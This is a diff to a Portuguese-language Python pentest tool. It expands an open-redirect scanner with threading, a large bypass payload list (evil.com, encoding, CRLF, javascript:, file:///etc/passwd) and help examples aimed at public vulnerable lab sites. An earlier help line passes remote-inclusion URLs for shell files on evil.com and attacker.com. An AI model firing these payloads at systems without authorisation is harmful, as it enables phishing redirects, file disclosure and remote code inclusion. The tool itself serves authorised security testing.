@@ -9244,86 +9244,662 @@ def ssrf_scan(url):
 # --- MÓDULO 19: SCANNER DE OPEN REDIRECT ---
 
 class OpenRedirectScanner:
-    def __init__(self, base_url):
+    def __init__(self, base_url, timeout=10, threads=5, custom_payloads=None, payload_file=None, max_payloads=None, follow_redirects=False, session_pool_size=None):
         self.base_url = base_url
-        self.session = requests.Session()
-        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
-        self.vulnerable_points = []
-        self.payload = "http://example.com"
-
-    def _scan_target(self, url, method, param, form_data=None):
-        try:
-            test_data = {param: self.payload}
-            if method.lower() == 'get':
-                response = self.session.get(url, params=test_data, timeout=7, verify=False, allow_redirects=False)
-            else:
-                post_payload = form_data.copy()
-                post_payload[param] = self.payload
-                response = self.session.post(url, data=post_payload, timeout=7, verify=False, allow_redirects=False)
+        self.timeout = timeout
+        self.threads = threads
+        self.custom_payloads = custom_payloads
+        self.payload_file = payload_file
+        self.max_payloads = max_payloads
+        self.follow_redirects = follow_redirects
+        self.verbose = False
+        self.fast_mode = False
+        self.export_results = False
+        
+        # Session pool para melhor performance
+        self.session_pool = []
+        pool_size = session_pool_size if session_pool_size else min(threads, 10)
+        for _ in range(pool_size):
+            session = requests.Session()
+            session.headers.update({
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Accept-Encoding': 'gzip, deflate',
+                'Connection': 'keep-alive'
+            })
+            # Configurar pool de conexões
+            adapter = requests.adapters.HTTPAdapter(
+                pool_connections=10,
+                pool_maxsize=20,
+                max_retries=1
+            )
+            session.mount('http://', adapter)
+            session.mount('https://', adapter)
+            self.session_pool.append(session)
             
-            if response.status_code in [301, 302, 303, 307, 308] and 'Location' in response.headers:
-                if "example.com" in response.headers['Location']:
-                    finding = {"Risco": "Médio", "Tipo": "Open Redirect", "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})", "Recomendação": f"A aplicação redireciona para um URL externo ('{self.payload}') sem validação."}
-                    if finding not in self.vulnerable_points: self.vulnerable_points.append(finding)
-        except requests.RequestException: pass
+        self.current_session_index = 0
+        self.vulnerable_points = []
+        
+        # Payloads avançados para Open Redirect
+        self.payloads = {
+            # Payloads básicos
+            "http://example.com": ["example.com"],
+            "https://example.com": ["example.com"],
+            "http://evil.com": ["evil.com"],
+            "https://evil.com": ["evil.com"],
+            
+            # Payloads com protocolo relativo
+            "//example.com": ["example.com"],
+            "//evil.com": ["evil.com"],
+            "//evil.com/": ["evil.com"],
+            "///example.com": ["example.com"],
+            
+            # IP Address variations
+            "http://127.0.0.1": ["127.0.0.1"],
+            "http://0x7f000001": ["0x7f000001"],
+            "http://2130706433": ["2130706433"],
+            "http://0177.0.0.1": ["0177.0.0.1"],
+            "http://127.1": ["127.1"],
+            
+            # Bypass tentativas
+            "http://example.com@target.com": ["example.com"],
+            "http://target.com#@example.com": ["example.com"],
+            "http://target.com.example.com": ["example.com"],
+            "http://example.com.target.com": ["example.com"],
+            
+            # Encoding variations
+            "http%3A%2F%2Fexample.com": ["example.com"],
+            "http%3a%2f%2fexample.com": ["example.com"],
+            "%2F%2Fexample.com": ["example.com"],
+            "%2f%2fexample.com": ["example.com"],
+            
+            # Double encoding
+            "http%253A%252F%252Fexample.com": ["example.com"],
+            "%252F%252Fexample.com": ["example.com"],
+            
+            # Unicode/UTF-8 encoding
+            "http://еxample.com": ["еxample.com"],  # Cyrillic e
+            "http://ехample.com": ["ехample.com"],  # Cyrillic x
+            
+            # Directory traversal combinations
+            "http://target.com/../example.com": ["example.com"],
+            "http://target.com/..%2Fexample.com": ["example.com"],
+            "http://target.com/..%252Fexample.com": ["example.com"],
+            
+            # JavaScript payloads
+            "javascript:alert('Open Redirect')": ["javascript:"],
+            "javascript:window.location='http://example.com'": ["javascript:", "example.com"],
+            "javascript://example.com": ["javascript:", "example.com"],
+            
+            # Data URI payloads
+            "data:text/html,<script>location='http://example.com'</script>": ["data:", "example.com"],
+            "data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cDovL2V4YW1wbGUuY29tJzwvc2NyaXB0Pg==": ["data:", "example.com"],
+            
+            # File protocol
+            "file:///etc/passwd": ["file://"],
+            "file://example.com/etc/passwd": ["file://", "example.com"],
+            
+            # FTP protocol
+            "ftp://example.com": ["ftp://", "example.com"],
+            "ftp://evil.com": ["ftp://", "evil.com"],
+            
+            # LDAP/other protocols
+            "ldap://example.com": ["ldap://", "example.com"],
+            "dict://example.com": ["dict://", "example.com"],
+            "gopher://example.com": ["gopher://", "example.com"],
+            
+            # Fragment/anchor bypasses
+            "http://target.com#http://example.com": ["example.com"],
+            "http://target.com#//example.com": ["example.com"],
+            
+            # Query parameter bypasses
+            "http://target.com?url=http://example.com": ["example.com"],
+            "http://target.com?redirect=//example.com": ["example.com"],
+            
+            # Whitespace bypasses
+            " http://example.com": ["example.com"],
+            "http://example.com ": ["example.com"],
+            "%20http://example.com": ["example.com"],
+            "http://example.com%20": ["example.com"],
+            
+            # Tab and newline bypasses
+            "%09http://example.com": ["example.com"],
+            "%0ahttp://example.com": ["example.com"],
+            "%0dhttp://example.com": ["example.com"],
+            
+            # Mixed case
+            "HTTP://EXAMPLE.COM": ["EXAMPLE.COM"],
+            "hTTp://ExAmPlE.cOm": ["ExAmPlE.cOm"],
+            
+            # Backslash bypasses (Windows)
+            "http:\\\\example.com": ["example.com"],
+            "http:\\example.com": ["example.com"],
+            "\\\\example.com": ["example.com"],
+            
+            # Null byte bypasses
+            "http://example.com%00.target.com": ["example.com"],
+            "http://example.com%00/": ["example.com"],
+            
+            # CRLF injection attempts
+            "http://target.com%0d%0aLocation: http://example.com": ["example.com"],
+            "http://target.com%0aLocation:%20http://example.com": ["example.com"]
+        }
+        
+        # Carregar payloads customizados
+        self._load_custom_payloads()
+        
+        # Aplicar limite de payloads se especificado
+        self._apply_payload_limit()
+
+    def _load_custom_payloads(self):
+        """Carrega payloads customizados do CLI ou arquivo"""
+        custom_payload_list = []
+        
+        # Processar payloads da linha de comando
+        if self.custom_payloads:
+            payloads_from_cli = [payload.strip() for payload in self.custom_payloads.split(',')]
+            custom_payload_list.extend(payloads_from_cli)
+            if self.verbose:
+                console.print(f"[*] Carregados {len(payloads_from_cli)} payloads da linha de comando")
+        
+        # Processar payloads de arquivo
+        if self.payload_file:
+            try:
+                with open(self.payload_file, 'r', encoding='utf-8', errors='ignore') as f:
+                    payloads_from_file = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
+                custom_payload_list.extend(payloads_from_file)
+                if self.verbose:
+                    console.print(f"[*] Carregados {len(payloads_from_file)} payloads do arquivo: {self.payload_file}")
+            except FileNotFoundError:
+                console.print(f"[red][!] Arquivo de payloads não encontrado: {self.payload_file}[/red]")
+            except Exception as e:
+                console.print(f"[red][!] Erro ao ler arquivo de payloads: {e}[/red]")
+        
+        # Adicionar payloads customizados ao dicionário principal
+        if custom_payload_list:
+            for payload in custom_payload_list:
+                # Detectar automaticamente indicadores baseados no payload
+                indicators = []
+                
+                # URLs completas
+                if payload.startswith(('http://', 'https://')):
+                    parsed = urlparse(payload)
+                    if parsed.netloc:
+                        indicators.append(parsed.netloc)
+                
+                # Protocolos especiais
+                for protocol in ['javascript:', 'data:', 'file://', 'ftp://', 'ldap://', 'dict://', 'gopher://']:
+                    if payload.lower().startswith(protocol):
+                        indicators.append(protocol)
+                
+                # URLs relativas
+                if payload.startswith('//'):
+                    domain = payload[2:].split('/')[0].split('?')[0].split('#')[0]
+                    if domain:
+                        indicators.append(domain)
+                
+                # Fallback para payload genérico
+                if not indicators:
+                    indicators = [payload[:20]]  # Primeiros 20 caracteres
+                
+                self.payloads[payload] = indicators
+            
+            if self.verbose:
+                console.print(f"[*] Total de {len(custom_payload_list)} payloads customizados adicionados")
+                console.print(f"[*] Total geral de payloads: {len(self.payloads)}")
+
+    def _apply_payload_limit(self):
+        """Aplica limite máximo de payloads se especificado"""
+        if self.max_payloads and len(self.payloads) > self.max_payloads:
+            # Manter os payloads mais importantes (básicos primeiro)
+            critical_payloads = [
+                "http://example.com", "https://example.com", "//example.com",
+                "http://evil.com", "javascript:alert('Open Redirect')"
+            ]
+            
+            # Separar payloads críticos dos demais
+            priority_payloads = {k: v for k, v in self.payloads.items() if k in critical_payloads}
+            other_payloads = {k: v for k, v in self.payloads.items() if k not in priority_payloads}
+            
+            # Construir lista limitada priorizando críticos
+            limited_payloads = priority_payloads.copy()
+            remaining_slots = self.max_payloads - len(priority_payloads)
+            
+            if remaining_slots > 0:
+                other_items = list(other_payloads.items())[:remaining_slots]
+                limited_payloads.update(dict(other_items))
+            
+            self.payloads = limited_payloads
+            if self.verbose:
+                console.print(f"[*] Payloads limitados a {len(self.payloads)} (máximo: {self.max_payloads})")
+                console.print(f"[*] Priorizados {len(priority_payloads)} payloads críticos")
+
+    def _get_session(self):
+        """Obtém uma sessão do pool de forma round-robin"""
+        session = self.session_pool[self.current_session_index]
+        self.current_session_index = (self.current_session_index + 1) % len(self.session_pool)
+        return session
+
+    def _scan_target(self, args):
+        """Testa um payload específico (para uso com ThreadPoolExecutor)"""
+        url, method, param, form_data, payload, indicators, session = args
+        
+        try:
+            start_time = time.time()
+            
+            test_data = {param: payload}
+            if method.lower() == 'get':
+                response = session.get(url, params=test_data, timeout=self.timeout, verify=False, allow_redirects=self.follow_redirects)
+            else:
+                post_payload = form_data.copy() if form_data else {}
+                post_payload[param] = payload
+                response = session.post(url, data=post_payload, timeout=self.timeout, verify=False, allow_redirects=self.follow_redirects)
+            
+            response_time = time.time() - start_time
+            
+            # Verificar redirecionamentos HTTP
+            if response.status_code in [301, 302, 303, 307, 308]:
+                location = response.headers.get('Location', '')
+                if location and any(indicator in location for indicator in indicators):
+                    return self._create_finding(url, method, param, payload, location, "HTTP Redirect", response.status_code, response_time, "Alto")
+            
+            # Verificar redirecionamentos JavaScript no corpo da resposta
+            if response.status_code == 200:
+                content = response.text.lower()
+                js_patterns = [
+                    'window.location', 'document.location', 'location.href',
+                    'location.replace', 'location.assign', 'window.open'
+                ]
+                
+                for pattern in js_patterns:
+                    if pattern in content:
+                        for indicator in indicators:
+                            if indicator.lower() in content:
+                                return self._create_finding(url, method, param, payload, content[:200], "JavaScript Redirect", response.status_code, response_time, "Médio")
+                
+                # Verificar Meta refresh
+                if '<meta' in content and 'refresh' in content:
+                    for indicator in indicators:
+                        if indicator.lower() in content:
+                            return self._create_finding(url, method, param, payload, content[:200], "Meta Refresh", response.status_code, response_time, "Médio")
+            
+            # Detectar redirecionamentos suspeitos baseados em tempo de resposta
+            if response_time > 3.0 and response.status_code == 200:
+                for indicator in indicators:
+                    if indicator.lower() in response.text.lower():
+                        return self._create_finding(url, method, param, payload, f"Delay suspeito: {response_time:.2f}s", "Timing-based", response.status_code, response_time, "Baixo")
+                        
+        except requests.RequestException:
+            pass
+        
+        return None
+
+    def _create_finding(self, url, method, param, payload, evidence, redirect_type, status_code, response_time, risk):
+        """Cria um finding estruturado"""
+        return {
+            "Risco": risk,
+            "Tipo": f"Open Redirect ({redirect_type})",
+            "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})",
+            "Recomendação": f"A aplicação redireciona para URL externo sem validação adequada.",
+            "Payload": payload,
+            "Evidence": evidence[:200] if len(evidence) > 200 else evidence,
+            "Full_URL": f"{url}?{param}={payload}" if method.lower() == 'get' else url,
+            "Method": method.upper(),
+            "Status_Code": status_code,
+            "Response_Time": round(response_time, 3),
+            "Redirect_Type": redirect_type,
+            "Confidence": "High" if redirect_type == "HTTP Redirect" else "Medium"
+        }
 
     def run_scan(self, return_findings=False):
         if not return_findings:
-            console.print("-" * 60)
-            console.print(f"[*] Executando scanner de Open Redirect em: [bold cyan]{self.base_url}[/bold cyan]")
-            console.print("-" * 60)
+            console.print("-" * 80)
+            console.print(f"[*] Executando scanner avançado de Open Redirect em: [bold cyan]{self.base_url}[/bold cyan]")
+            console.print(f"[*] Timeout: {self.timeout}s | Threads: {self.threads} | Payloads: {len(self.payloads)}")
+            
+            if self.fast_mode:
+                console.print(f"[*] Modo: [yellow]RÁPIDO[/yellow] - Usando payloads otimizados")
+            else:
+                console.print(f"[*] Modo: [blue]COMPLETO[/blue] - Todos os payloads disponíveis")
+            
+            if self.verbose:
+                console.print(f"[*] Modo verbose: [green]ATIVO[/green] - Exibindo detalhes completos")
+                console.print(f"[*] Pool de sessões: {len(self.session_pool)} sessões HTTP reutilizáveis")
+                console.print(f"[*] Follow redirects: {'ATIVO' if self.follow_redirects else 'DESATIVO'}")
+                console.print(f"[*] Execução: [cyan]PARALELA[/cyan] com ThreadPoolExecutor")
+                
+                # Mostrar configurações customizadas
+                if self.max_payloads:
+                    console.print(f"[*] Limite de payloads: {self.max_payloads} (customizado)")
+                if self.custom_payloads or self.payload_file:
+                    console.print(f"[*] Payloads customizados: [green]ATIVO[/green]")
+                
+            console.print("-" * 80)
+        
+        start_time = time.time()
+        
+        if self.verbose:
+            console.print("[*] Conectando ao alvo...")
+            
         try:
             with console.status("[bold green]Coletando pontos de entrada...[/bold green]"):
-                response = self.session.get(self.base_url, timeout=10, verify=False)
+                response = self._get_session().get(self.base_url, timeout=self.timeout, verify=False)
                 soup = BeautifulSoup(response.content, 'html.parser')
+                
+            if self.verbose:
+                console.print(f"[*] Resposta do servidor: {response.status_code}")
+                console.print(f"[*] Tamanho da página: {len(response.text)} bytes")
+                console.print(f"[*] Content-Type: {response.headers.get('content-type', 'N/A')}")
+                
         except requests.RequestException as e:
             if not return_findings: console.print(f"[bold red][!] Não foi possível aceder à página inicial: {e}[/bold red]")
             return [] if return_findings else None
 
-        common_params = ['url', 'redirect', 'next', 'goto', 'return', 'dest']
+        # Parâmetros comuns expandidos para Open Redirect
+        common_params = [
+            'url', 'redirect', 'next', 'goto', 'return', 'dest', 'destination',
+            'continue', 'returnUrl', 'return_url', 'redirectUrl', 'redirect_url',
+            'forward', 'forwardUrl', 'forward_url', 'target', 'targetUrl',
+            'exit', 'exitUrl', 'backUrl', 'back_url', 'callback', 'callbackUrl',
+            'link', 'href', 'to', 'from', 'redir', 'referer', 'location',
+            'path', 'site', 'domain', 'host', 'uri', 'page', 'view'
+        ]
+        
         tasks = []
+        
+        # Coletar links com parâmetros
         links = {urljoin(self.base_url, a['href']) for a in soup.find_all('a', href=True) if '?' in a['href'] and '=' in a['href']}
         for link in links:
             parsed = urlparse(link)
             base = urlunparse(parsed._replace(query=""))
             for param in parse_qs(parsed.query):
-                if any(p in param.lower() for p in common_params): tasks.append(('get', base, param, None))
+                if any(p in param.lower() for p in common_params):
+                    for payload, indicators in self.payloads.items():
+                        session = self._get_session()
+                        tasks.append((base, 'get', param, None, payload, indicators, session))
 
+        # Coletar formulários
         forms = soup.find_all('form')
         for form in forms:
             action = urljoin(self.base_url, form.get('action', ''))
             method = form.get('method', 'post').lower()
             data = {i.get('name'): 'test' for i in form.find_all(['input', 'textarea']) if i.get('name')}
             for param in data:
-                if any(p in param.lower() for p in common_params): tasks.append((method, action, param, data))
+                if any(p in param.lower() for p in common_params):
+                    for payload, indicators in self.payloads.items():
+                        session = self._get_session()
+                        tasks.append((action, method, param, data, payload, indicators, session))
         
         if not tasks:
             if not return_findings: console.print("[yellow]Nenhum parâmetro comum de Open Redirect encontrado para testar.[/yellow]")
             return [] if return_findings else None
 
-        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeRemainingColumn(), console=console, transient=return_findings) as progress:
-            task_id = progress.add_task("[green]Testando Open Redirect...", total=len(tasks))
-            for method, url, param, form_data in tasks:
-                progress.update(task_id, advance=1, description=f"[green]Testando [cyan]{param}[/cyan]...")
-                self._scan_target(url, method, param, form_data)
+        if self.verbose:
+            console.print(f"[*] Encontrados {len(tasks)} pontos de teste")
+            console.print(f"[*] Iniciando testes paralelos...")
+        
+        # Executar testes em paralelo
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            if not return_findings:
+                with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeRemainingColumn(), console=console, transient=return_findings) as progress:
+                    task_id = progress.add_task("[green]Testando Open Redirect...", total=len(tasks))
+                    
+                    futures = {executor.submit(self._scan_target, task): task for task in tasks}
+                    for future in as_completed(futures):
+                        task = futures[future]
+                        progress.update(task_id, advance=1, description=f"[green]Testando [cyan]{task[2]}[/cyan]...")
+                        
+                        try:
+                            result = future.result()
+                            if result:
+                                self.vulnerable_points.append(result)
+                                if self.verbose:
+                                    console.print(f"[red][+] Vulnerabilidade encontrada: {result['Tipo']} em {result['Detalhe']}[/red]")
+                        except Exception as e:
+                            if self.verbose:
+                                console.print(f"[red][!] Erro no teste: {e}[/red]")
+            else:
+                futures = {executor.submit(self._scan_target, task): task for task in tasks}
+                for future in as_completed(futures):
+                    try:
+                        result = future.result()
+                        if result:
+                            self.vulnerable_points.append(result)
+                    except Exception:
+                        pass
 
-        if return_findings: return self.vulnerable_points
+        scan_duration = time.time() - start_time
+        
+        if not return_findings:
+            console.print(f"\n[*] Scan concluído em {scan_duration:.2f} segundos")
+            console.print(f"[*] {len(tasks)} testes realizados | {len(self.vulnerable_points)} vulnerabilidades encontradas")
+            
+        if return_findings: 
+            return self.vulnerable_points
+            
         self._present_findings()
+        
+        if self.export_results:
+            self.export_findings()
+        
+        return self.vulnerable_points
 
     def _present_findings(self):
-        console.print("-" * 60)
+        console.print("-" * 80)
         if not self.vulnerable_points:
             console.print("[bold green][+] Nenhuma vulnerabilidade de Open Redirect foi encontrada.[/bold green]")
         else:
-            table = Table(title="Potenciais Vulnerabilidades de Open Redirect Encontradas")
-            table.add_column("Detalhe", style="cyan")
-            table.add_column("Recomendação", style="white")
-            for f in self.vulnerable_points: table.add_row(f['Detalhe'], f['Recomendação'])
-            console.print(table)
-        console.print("-" * 60)
+            # Separar por tipo de redirecionamento
+            http_redirects = [f for f in self.vulnerable_points if 'HTTP Redirect' in f['Tipo']]
+            js_redirects = [f for f in self.vulnerable_points if 'JavaScript' in f['Tipo']]
+            meta_redirects = [f for f in self.vulnerable_points if 'Meta Refresh' in f['Tipo']]
+            timing_redirects = [f for f in self.vulnerable_points if 'Timing' in f['Tipo']]
+            
+            # Resumo executivo destacado
+            high_risk = len([f for f in self.vulnerable_points if f['Risco'] == 'Alto'])
+            medium_risk = len([f for f in self.vulnerable_points if f['Risco'] == 'Médio'])
+            
+            if high_risk > 0:
+                console.print(f"[bold red]⚠️  ALERTA: {high_risk} vulnerabilidade(s) de ALTO RISCO encontrada(s)![/bold red]")
+            if medium_risk > 0:
+                console.print(f"[bold orange1]⚠️  ATENÇÃO: {medium_risk} vulnerabilidade(s) de MÉDIO RISCO encontrada(s)![/bold orange1]")
+            
+            console.print()
+            
+            # Tabela principal de vulnerabilidades
+            critical_medium = [f for f in self.vulnerable_points if f['Risco'] in ['Alto', 'Médio']]
+            if critical_medium:
+                table = Table(title="[bold red]🔴 Vulnerabilidades de Open Redirect Encontradas[/bold red]")
+                table.add_column("Tipo", style="red", width=15)
+                table.add_column("Risco", style="red", width=8)
+                table.add_column("Parâmetro", style="cyan", width=12)
+                table.add_column("Payload", style="yellow", width=25)
+                table.add_column("Evidência", style="magenta", width=20)
+                table.add_column("Confiança", style="green", width=10)
+                
+                for f in critical_medium:
+                    payload_display = f.get('Payload', 'N/A')[:25] + '...' if len(f.get('Payload', '')) > 25 else f.get('Payload', 'N/A')
+                    evidence_display = f.get('Evidence', 'N/A')[:20] + '...' if len(f.get('Evidence', '')) > 20 else f.get('Evidence', 'N/A')
+                    
+                    table.add_row(
+                        f.get('Redirect_Type', 'Open Redirect'),
+                        f['Risco'],
+                        f['Detalhe'].split("'")[1] if "'" in f['Detalhe'] else 'N/A',
+                        payload_display,
+                        evidence_display,
+                        f.get('Confidence', 'Medium')
+                    )
+                console.print(table)
+                console.print()
+                
+                # Detalhes técnicos para cada vulnerabilidade
+                for idx, finding in enumerate(critical_medium, 1):
+                    console.print(f"[bold red]📋 Detalhes Técnicos - Vulnerabilidade {idx}:[/bold red]")
+                    console.print(f"   • [bold]URL Completa:[/bold] {finding.get('Full_URL', 'N/A')}")
+                    console.print(f"   • [bold]Payload Usado:[/bold] {finding.get('Payload', 'N/A')}")
+                    console.print(f"   • [bold]Método HTTP:[/bold] {finding.get('Method', 'GET')}")
+                    console.print(f"   • [bold]Status Code:[/bold] {finding.get('Status_Code', 'N/A')}")
+                    console.print(f"   • [bold]Tempo Resposta:[/bold] {finding.get('Response_Time', 'N/A')}s")
+                    console.print(f"   • [bold]Tipo Redirecionamento:[/bold] {finding.get('Redirect_Type', 'N/A')}")
+                    console.print(f"   • [bold]Evidência:[/bold] {finding.get('Evidence', 'N/A')}")
+                    console.print()
+            
+            # Vulnerabilidades de baixo risco
+            low_risk = [f for f in self.vulnerable_points if f['Risco'] == 'Baixo']
+            if low_risk:
+                table2 = Table(title="[bold yellow]🟡 Vulnerabilidades de Baixo Risco[/bold yellow]")
+                table2.add_column("Tipo", style="yellow", width=15)
+                table2.add_column("Parâmetro", style="cyan", width=15)
+                table2.add_column("Método Detecção", style="green", width=15)
+                table2.add_column("Evidência", style="blue", width=25)
+                
+                for f in low_risk:
+                    evidence_display = f.get('Evidence', 'N/A')[:25] + '...' if len(f.get('Evidence', '')) > 25 else f.get('Evidence', 'N/A')
+                    
+                    table2.add_row(
+                        f.get('Redirect_Type', 'Open Redirect'),
+                        f['Detalhe'].split("'")[1] if "'" in f['Detalhe'] else 'N/A',
+                        f.get('Redirect_Type', 'Unknown'),
+                        evidence_display
+                    )
+                console.print(table2)
+                console.print()
+            
+            # Estatísticas detalhadas
+            stats_table = Table(title="[bold blue]📊 Estatísticas do Scan[/bold blue]")
+            stats_table.add_column("Categoria", style="blue", width=25)
+            stats_table.add_column("Quantidade", style="white", width=10)
+            stats_table.add_column("Percentual", style="cyan", width=10)
+            
+            total_vulns = len(self.vulnerable_points)
+            stats_table.add_row("Total de Vulnerabilidades", str(total_vulns), "100%")
+            stats_table.add_row("HTTP Redirects", str(len(http_redirects)), f"{len(http_redirects)/total_vulns*100:.1f}%" if total_vulns > 0 else "0%")
+            stats_table.add_row("JavaScript Redirects", str(len(js_redirects)), f"{len(js_redirects)/total_vulns*100:.1f}%" if total_vulns > 0 else "0%")
+            stats_table.add_row("Meta Refresh", str(len(meta_redirects)), f"{len(meta_redirects)/total_vulns*100:.1f}%" if total_vulns > 0 else "0%")
+            stats_table.add_row("Timing-based", str(len(timing_redirects)), f"{len(timing_redirects)/total_vulns*100:.1f}%" if total_vulns > 0 else "0%")
+            stats_table.add_row("Alto Risco", str(high_risk), f"{high_risk/total_vulns*100:.1f}%" if total_vulns > 0 else "0%")
+            stats_table.add_row("Médio Risco", str(medium_risk), f"{medium_risk/total_vulns*100:.1f}%" if total_vulns > 0 else "0%")
+            stats_table.add_row("Baixo Risco", str(len(low_risk)), f"{len(low_risk)/total_vulns*100:.1f}%" if total_vulns > 0 else "0%")
+            
+            console.print(stats_table)
+            
+            # Recomendações priorizadas
+            console.print("\n[bold blue]🛡️  Recomendações Priorizadas para Correção:[/bold blue]")
+            if high_risk > 0 or medium_risk > 0:
+                console.print("[bold red]🔴 AÇÃO IMEDIATA NECESSÁRIA:[/bold red]")
+                console.print("   1. Implementar whitelist de domínios permitidos para redirecionamento")
+                console.print("   2. Validar URLs de destino contra lista de domínios confiáveis")
+                console.print("   3. Usar redirecionamentos relativos sempre que possível")
+                console.print("   4. Implementar verificação de referer para redirecionamentos")
+                console.print()
+            
+            console.print("[bold yellow]🟡 MELHORIAS DE SEGURANÇA:[/bold yellow]")
+            console.print("   • Implementar Content Security Policy (CSP)")
+            console.print("   • Adicionar logs de auditoria para redirecionamentos")
+            console.print("   • Implementar rate limiting para parâmetros de redirecionamento")
+            console.print("   • Educar usuários sobre riscos de phishing")
+            console.print("   • Implementar notificações para redirecionamentos externos")
+            
+            # Próximos passos para pentest
+            console.print("\n[bold cyan]🔍 Próximos Passos para Pentest:[/bold cyan]")
+            if http_redirects:
+                console.print("   • Testar bypass de filtros com encoding avançado")
+                console.print("   • Verificar redirecionamentos em cadeia")
+                console.print("   • Testar com domínios similares para phishing")
+            if js_redirects:
+                console.print("   • Analisar código JavaScript para bypass de validação")
+                console.print("   • Testar combinação com XSS para redirecionamento malicioso")
+            
+        console.print("-" * 80)
 
-def open_redirect_scan(url):
-    OpenRedirectScanner(url).run_scan()
+    def export_findings(self, filename='open_redirect_scan_results.json'):
+        """Exporta os resultados para um arquivo JSON"""
+        if not self.vulnerable_points:
+            console.print("[yellow]Nenhuma vulnerabilidade encontrada para exportar.[/yellow]")
+            return
+            
+        # Análise de tipos de redirecionamento encontrados
+        redirect_types = {}
+        confidence_levels = {'High': 0, 'Medium': 0, 'Low': 0}
+        
+        for finding in self.vulnerable_points:
+            redirect_type = finding.get('Redirect_Type', 'Unknown')
+            redirect_types[redirect_type] = redirect_types.get(redirect_type, 0) + 1
+            
+            conf = finding.get('Confidence', 'Medium')
+            confidence_levels[conf] = confidence_levels.get(conf, 0) + 1
+        
+        export_data = {
+            'scan_info': {
+                'target': self.base_url,
+                'timestamp': datetime.now().isoformat(),
+                'total_vulnerabilities': len(self.vulnerable_points),
+                'scanner_version': '3.0 Enhanced',
+                'timeout': self.timeout,
+                'threads': self.threads,
+                'payloads_tested': len(self.payloads),
+                'follow_redirects': self.follow_redirects
+            },
+            'vulnerabilities': self.vulnerable_points,
+            'statistics': {
+                'risk_distribution': {
+                    'high': len([f for f in self.vulnerable_points if f['Risco'] == 'Alto']),
+                    'medium': len([f for f in self.vulnerable_points if f['Risco'] == 'Médio']),
+                    'low': len([f for f in self.vulnerable_points if f['Risco'] == 'Baixo'])
+                },
+                'redirect_types': redirect_types,
+                'confidence_levels': confidence_levels
+            },
+            'recommendations': {
+                'immediate_actions': [
+                    "Implementar whitelist de domínios permitidos para redirecionamento",
+                    "Validar URLs de destino contra lista de domínios confiáveis",
+                    "Usar redirecionamentos relativos sempre que possível",
+                    "Implementar verificação de referer para redirecionamentos"
+                ],
+                'security_improvements': [
+                    "Implementar Content Security Policy (CSP)",
+                    "Adicionar logs de auditoria para redirecionamentos",
+                    "Implementar rate limiting para parâmetros de redirecionamento",
+                    "Educar usuários sobre riscos de phishing",
+                    "Implementar notificações para redirecionamentos externos"
+                ],
+                'pentest_next_steps': [
+                    "Testar bypass de filtros com encoding avançado",
+                    "Verificar redirecionamentos em cadeia",
+                    "Testar com domínios similares para phishing",
+                    "Analisar código JavaScript para bypass de validação",
+                    "Testar combinação com XSS para redirecionamento malicioso"
+                ]
+            }
+        }
+        
+        try:
+            with open(filename, 'w', encoding='utf-8') as f:
+                json.dump(export_data, f, indent=2, ensure_ascii=False)
+            console.print(f"[green]Resultados exportados para: {filename}[/green]")
+        except Exception as e:
+            console.print(f"[red]Erro ao exportar resultados: {e}[/red]")
+
+def open_redirect_scan(url, timeout=10, threads=5, export_results=False, verbose=False, fast_mode=False, custom_payloads=None, payload_file=None, max_payloads=None, follow_redirects=False, session_pool_size=None):
+    """Função principal para executar scan de Open Redirect otimizado"""
+    scanner = OpenRedirectScanner(
+        url, 
+        timeout=timeout, 
+        threads=threads, 
+        custom_payloads=custom_payloads, 
+        payload_file=payload_file,
+        max_payloads=max_payloads,
+        follow_redirects=follow_redirects,
+        session_pool_size=session_pool_size
+    )
+    scanner.verbose = verbose
+    scanner.fast_mode = fast_mode
+    scanner.export_results = export_results
+    return scanner.run_scan()
+
+# Função legada removida - usar a nova implementação acima
 
 # --- MÓDULO 20: SCANNER DE CVE (API NVD OFICIAL) ---
 
@@ -10609,6 +11185,28 @@ Exemplos de Uso:
   # Scanner LFI com URLs RFI customizadas e pool de sessões otimizado
   python %(prog)s lfi-scan -u "https://demo.testfire.net/bank/queryxpath.aspx" --custom-rfi "http://evil.com/shell.txt,https://attacker.com/payload.php" --session-pool-size 15
 
+  [ Scanner de Open Redirect (Avançado) ]
+  # Scanner básico de Open Redirect
+  python %(prog)s open-redirect-scan -u "http://testphp.vulnweb.com/redirect.php?url=test"
+  
+  # Scanner de Open Redirect com timeout customizado e export
+  python %(prog)s open-redirect-scan -u "https://demo.testfire.net/bank/queryxpath.aspx" --timeout 15 --export
+  
+  # Scanner de Open Redirect com múltiplas threads e modo verbose
+  python %(prog)s open-redirect-scan -u "https://portswigger-labs.net/redirect_lab" --threads 10 --verbose
+  
+  # Scanner de Open Redirect em modo rápido com threads otimizadas
+  python %(prog)s open-redirect-scan -u "http://dvwa.local/vulnerabilities/csrf/" --fast --threads 15
+  
+  # Scanner de Open Redirect com payloads customizados
+  python %(prog)s open-redirect-scan -u "http://testphp.vulnweb.com/redirect.php" --custom-payloads "http://evil.com,//attacker.com,javascript:alert('redir')" --verbose
+  
+  # Scanner de Open Redirect usando arquivo de payloads
+  python %(prog)s open-redirect-scan -u "https://demo.testfire.net/bank/main.aspx" --payload-file "redirect_payloads.txt" --export
+  
+  # Scanner de Open Redirect com configurações avançadas
+  python %(prog)s open-redirect-scan -u "http://dvwa.local/vulnerabilities/fi/" --max-payloads 25 --follow-redirects --session-pool-size 15 --verbose
+
   # Procura por CVEs para OpenSSL, ignorando o cache e filtrando por CVSS
   python %(prog)s cve-scan --product openssl --version 1.0.2 --min-cvss 7.0 --no-cache
 
@@ -10748,8 +11346,18 @@ Para ajuda sobre um comando específico, use: python %(prog)s [comando] --help
